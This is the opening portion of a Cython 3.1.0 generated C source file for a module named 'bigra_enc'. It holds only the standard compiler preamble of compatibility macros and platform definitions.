/* Generated by Cython 3.1.0 */

/* BEGIN: Cython Metadata
{
    "distutils": {
        "name": "bigra_enc",
        "sources": [
            "/storage/emulated/0/Tool/bigra_enc.py"
        ]
    },
    "module_name": "bigra_enc"
}
END: Cython Metadata */

#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
/* InitLimitedAPI */
#if defined(Py_LIMITED_API) && !defined(CYTHON_LIMITED_API)
  #define CYTHON_LIMITED_API 1
#endif

#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x03080000
    #error Cython requires Python 3.8+.
#else
#define __PYX_ABI_VERSION "3_1_0"
#define CYTHON_HEX_VERSION 0x030100F0
#define CYTHON_FUTURE_DIVISION 1
/* CModulePreamble */
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #define HAVE_LONG_LONG
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#define __PYX_LIMITED_VERSION_HEX PY_VERSION_HEX
#if defined(GRAALVM_PYTHON)
  /* For very preliminary testing purposes. Most variables are set the same as PyPy.
     The existence of this section does not imply that anything works or is even tested */
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 1
  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_ASSUME_SAFE_SIZE
  #define CYTHON_ASSUME_SAFE_SIZE 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_SYS_MONITORING
  #define CYTHON_USE_SYS_MONITORING 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_AM_SEND
  #define CYTHON_USE_AM_SEND 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 1
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#elif defined(PYPY_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 1
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #ifndef CYTHON_ASSUME_SAFE_SIZE
    #define CYTHON_ASSUME_SAFE_SIZE 1
  #endif
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #if PY_VERSION_HEX < 0x03090000
    #undef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #undef CYTHON_USE_MODULE_STATE
  #define CYTHON_USE_MODULE_STATE 0
  #undef CYTHON_USE_SYS_MONITORING
  #define CYTHON_USE_SYS_MONITORING 0
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PYPY_VERSION_NUM >= 0x07030C00)
  #endif
  #undef CYTHON_USE_AM_SEND
  #define CYTHON_USE_AM_SEND 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC (PYPY_VERSION_NUM >= 0x07031100)
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#elif defined(CYTHON_LIMITED_API)
  #ifdef Py_LIMITED_API
    #undef __PYX_LIMITED_VERSION_HEX
    #define __PYX_LIMITED_VERSION_HEX Py_LIMITED_API
  #endif
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_LIMITED_API 1
  #define CYTHON_COMPILING_IN_GRAAL 0
  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0
  #undef CYTHON_CLINE_IN_TRACEBACK
  #define CYTHON_CLINE_IN_TRACEBACK 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_TYPE_SPECS
  #define CYTHON_USE_TYPE_SPECS 1
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #endif
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0
  #endif
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_ASSUME_SAFE_SIZE
  #define CYTHON_ASSUME_SAFE_SIZE 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_GIL
  #define CYTHON_FAST_GIL 0
  #undef CYTHON_METH_FASTCALL
  #define CYTHON_METH_FASTCALL (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_MODULE_STATE
    #define CYTHON_USE_MODULE_STATE 0
  #endif
  #undef CYTHON_USE_SYS_MONITORING
  #define CYTHON_USE_SYS_MONITORING 0
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 0
  #endif
  #ifndef CYTHON_USE_AM_SEND
    #define CYTHON_USE_AM_SEND (__PYX_LIMITED_VERSION_HEX >= 0x030A0000)
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
  #undef CYTHON_USE_FREELISTS
  #define CYTHON_USE_FREELISTS 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_LIMITED_API 0
  #define CYTHON_COMPILING_IN_GRAAL 0
  #ifdef Py_GIL_DISABLED
    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 1
  #else
    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0
  #endif
  #if PY_VERSION_HEX < 0x030A0000
    #undef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #elif !defined(CYTHON_USE_TYPE_SLOTS)
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #ifndef CYTHON_USE_TYPE_SPECS
    #define CYTHON_USE_TYPE_SPECS 0
  #endif
  #ifndef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #ifndef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    #undef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLIST_INTERNALS)
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS
    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1
  #elif !defined(CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS)
    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_ASSUME_SAFE_SIZE
    #define CYTHON_ASSUME_SAFE_SIZE 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #ifndef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    #undef CYTHON_FAST_GIL
    #define CYTHON_FAST_GIL 0
  #elif !defined(CYTHON_FAST_GIL)
    #define CYTHON_FAST_GIL (PY_VERSION_HEX < 0x030C00A6)
  #endif
  #ifndef CYTHON_METH_FASTCALL
    #define CYTHON_METH_FASTCALL 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL 1
  #endif
  #ifndef CYTHON_PEP487_INIT_SUBCLASS
    #define CYTHON_PEP487_INIT_SUBCLASS 1
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_MODULE_STATE
    #define CYTHON_USE_MODULE_STATE 0
  #endif
  #ifndef CYTHON_USE_SYS_MONITORING
    #define CYTHON_USE_SYS_MONITORING (PY_VERSION_HEX >= 0x030d00B1)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #ifndef CYTHON_USE_AM_SEND
    #define CYTHON_USE_AM_SEND 1
  #endif
  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING
    #undef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS 0
  #elif !defined(CYTHON_USE_DICT_VERSIONS)
    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5 && !CYTHON_USE_MODULE_STATE)
  #endif
  #ifndef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 1
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
  #ifndef CYTHON_USE_FREELISTS
    #define CYTHON_USE_FREELISTS (!CYTHON_COMPILING_IN_CPYTHON_FREETHREADING)
  #endif
#endif
#ifndef CYTHON_FAST_PYCCALL
#define CYTHON_FAST_PYCCALL  CYTHON_FAST_PYCALL
#endif
#ifndef CYTHON_VECTORCALL
#if CYTHON_COMPILING_IN_LIMITED_API
#define CYTHON_VECTORCALL  (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)
#else
#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)
#endif
#endif
#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)
#if CYTHON_USE_PYLONG_INTERNALS
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(maybe_unused) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(maybe_unused)
        #define CYTHON_UNUSED [[maybe_unused]]
      #endif
    #endif
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_USE_CPP_STD_MOVE
  #if defined(__cplusplus) && (\
    __cplusplus >= 201103L || (defined(_MSC_VER) && _MSC_VER >= 1600))
    #define CYTHON_USE_CPP_STD_MOVE 1
  #else
    #define CYTHON_USE_CPP_STD_MOVE 0
  #endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
            typedef unsigned char     uint8_t;
            typedef unsigned short    uint16_t;
            typedef unsigned int      uint32_t;
        #else
            typedef unsigned __int8   uint8_t;
            typedef unsigned __int16  uint16_t;
            typedef unsigned __int32  uint32_t;
        #endif
    #endif
    #if _MSC_VER < 1300
        #ifdef _WIN64
            typedef unsigned long long  __pyx_uintptr_t;
        #else
            typedef unsigned int        __pyx_uintptr_t;
        #endif
    #else
        #ifdef _WIN64
            typedef unsigned __int64    __pyx_uintptr_t;
        #else
            typedef unsigned __int32    __pyx_uintptr_t;
        #endif
    #endif
#else
    #include <stdint.h>
    typedef uintptr_t  __pyx_uintptr_t;
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus)
    /* for clang __has_cpp_attribute(fallthrough) is true even before C++17
     * but leads to warnings with -pedantic, since it is a C++17 feature */
    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)
      #if __has_cpp_attribute(fallthrough)
        #define CYTHON_FALLTHROUGH [[fallthrough]]
      #endif
    #endif
    #ifndef CYTHON_FALLTHROUGH
      #if __has_cpp_attribute(clang::fallthrough)
        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
      #elif __has_cpp_attribute(gnu::fallthrough)
        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
      #endif
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif
#ifndef Py_UNREACHABLE
  #define Py_UNREACHABLE()  assert(0); abort()
#endif
#ifdef __cplusplus
  template <typename T>
  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};
  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)
#else
  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)
#endif
#if CYTHON_COMPILING_IN_PYPY == 1
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)
#else
  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)
#endif
#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))

/* CInitCode */
#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

/* PythonCompatibility */
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#define __Pyx_BUILTIN_MODULE_NAME "builtins"
#define __Pyx_DefaultClassType PyType_Type
#if CYTHON_COMPILING_IN_LIMITED_API
    #ifndef CO_OPTIMIZED
    static int CO_OPTIMIZED;
    #endif
    #ifndef CO_NEWLOCALS
    static int CO_NEWLOCALS;
    #endif
    #ifndef CO_VARARGS
    static int CO_VARARGS;
    #endif
    #ifndef CO_VARKEYWORDS
    static int CO_VARKEYWORDS;
    #endif
    #ifndef CO_ASYNC_GENERATOR
    static int CO_ASYNC_GENERATOR;
    #endif
    #ifndef CO_GENERATOR
    static int CO_GENERATOR;
    #endif
    #ifndef CO_COROUTINE
    static int CO_COROUTINE;
    #endif
#else
    #ifndef CO_COROUTINE
      #define CO_COROUTINE 0x80
    #endif
    #ifndef CO_ASYNC_GENERATOR
      #define CO_ASYNC_GENERATOR 0x200
    #endif
#endif
static int __Pyx_init_co_variables(void);
#if PY_VERSION_HEX >= 0x030900A4 || defined(Py_IS_TYPE)
  #define __Pyx_IS_TYPE(ob, type) Py_IS_TYPE(ob, type)
#else
  #define __Pyx_IS_TYPE(ob, type) (((const PyObject*)ob)->ob_type == (type))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_Is)
  #define __Pyx_Py_Is(x, y)  Py_Is(x, y)
#else
  #define __Pyx_Py_Is(x, y) ((x) == (y))
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsNone)
  #define __Pyx_Py_IsNone(ob) Py_IsNone(ob)
#else
  #define __Pyx_Py_IsNone(ob) __Pyx_Py_Is((ob), Py_None)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsTrue)
  #define __Pyx_Py_IsTrue(ob) Py_IsTrue(ob)
#else
  #define __Pyx_Py_IsTrue(ob) __Pyx_Py_Is((ob), Py_True)
#endif
#if PY_VERSION_HEX >= 0x030A00B1 || defined(Py_IsFalse)
  #define __Pyx_Py_IsFalse(ob) Py_IsFalse(ob)
#else
  #define __Pyx_Py_IsFalse(ob) __Pyx_Py_Is((ob), Py_False)
#endif
#define __Pyx_NoneAsNull(obj)  (__Pyx_Py_IsNone(obj) ? NULL : (obj))
#if PY_VERSION_HEX >= 0x030900F0 && !CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyObject_GC_IsFinalized(o) PyObject_GC_IsFinalized(o)
#else
  #define __Pyx_PyObject_GC_IsFinalized(o) _PyGC_FINALIZED(o)
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef Py_TPFLAGS_SEQUENCE
  #define Py_TPFLAGS_SEQUENCE 0
#endif
#ifndef Py_TPFLAGS_MAPPING
  #define Py_TPFLAGS_MAPPING 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#ifndef METH_FASTCALL
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #if PY_VERSION_HEX >= 0x030d00A4
  #  define __Pyx_PyCFunctionFast PyCFunctionFast
  #  define __Pyx_PyCFunctionFastWithKeywords PyCFunctionFastWithKeywords
  #else
  #  define __Pyx_PyCFunctionFast _PyCFunctionFast
  #  define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
  #endif
#endif
#if CYTHON_METH_FASTCALL
  #define __Pyx_METH_FASTCALL METH_FASTCALL
  #define __Pyx_PyCFunction_FastCall __Pyx_PyCFunctionFast
  #define __Pyx_PyCFunction_FastCallWithKeywords __Pyx_PyCFunctionFastWithKeywords
#else
  #define __Pyx_METH_FASTCALL METH_VARARGS
  #define __Pyx_PyCFunction_FastCall PyCFunction
  #define __Pyx_PyCFunction_FastCallWithKeywords PyCFunctionWithKeywords
#endif
#if CYTHON_VECTORCALL
  #define __pyx_vectorcallfunc vectorcallfunc
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  PY_VECTORCALL_ARGUMENTS_OFFSET
  #define __Pyx_PyVectorcall_NARGS(n)  PyVectorcall_NARGS((size_t)(n))
#elif CYTHON_BACKPORT_VECTORCALL
  typedef PyObject *(*__pyx_vectorcallfunc)(PyObject *callable, PyObject *const *args,
                                            size_t nargsf, PyObject *kwnames);
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  ((size_t)1 << (8 * sizeof(size_t) - 1))
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(((size_t)(n)) & ~__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET))
#else
  #define __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET  0
  #define __Pyx_PyVectorcall_NARGS(n)  ((Py_ssize_t)(n))
#endif
#if PY_VERSION_HEX >= 0x030900B1
#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_CheckExact(func)
#else
#define __Pyx_PyCFunction_CheckExact(func)  PyCFunction_Check(func)
#endif
#define __Pyx_CyOrPyCFunction_Check(func)  PyCFunction_Check(func)
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  (((PyCFunctionObject*)(func))->m_ml->ml_meth)
#elif !CYTHON_COMPILING_IN_LIMITED_API
#define __Pyx_CyOrPyCFunction_GET_FUNCTION(func)  PyCFunction_GET_FUNCTION(func)
#endif
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_CyOrPyCFunction_GET_FLAGS(func)  (((PyCFunctionObject*)(func))->m_ml->ml_flags)
static CYTHON_INLINE PyObject* __Pyx_CyOrPyCFunction_GET_SELF(PyObject *func) {
    return (__Pyx_CyOrPyCFunction_GET_FLAGS(func) & METH_STATIC) ? NULL : ((PyCFunctionObject*)func)->m_self;
}
#endif
static CYTHON_INLINE int __Pyx__IsSameCFunction(PyObject *func, void (*cfunc)(void)) {
#if CYTHON_COMPILING_IN_LIMITED_API
    return PyCFunction_Check(func) && PyCFunction_GetFunction(func) == (PyCFunction) cfunc;
#else
    return PyCFunction_Check(func) && PyCFunction_GET_FUNCTION(func) == (PyCFunction) cfunc;
#endif
}
#define __Pyx_IsSameCFunction(func, cfunc)   __Pyx__IsSameCFunction(func, cfunc)
#if __PYX_LIMITED_VERSION_HEX < 0x03090000
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  ((void)m, PyType_FromSpecWithBases(s, b))
  typedef PyObject *(*__Pyx_PyCMethod)(PyObject *, PyTypeObject *, PyObject *const *, size_t, PyObject *);
#else
  #define __Pyx_PyType_FromModuleAndSpec(m, s, b)  PyType_FromModuleAndSpec(m, s, b)
  #define __Pyx_PyCMethod  PyCMethod
#endif
#ifndef METH_METHOD
  #define METH_METHOD 0x200
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
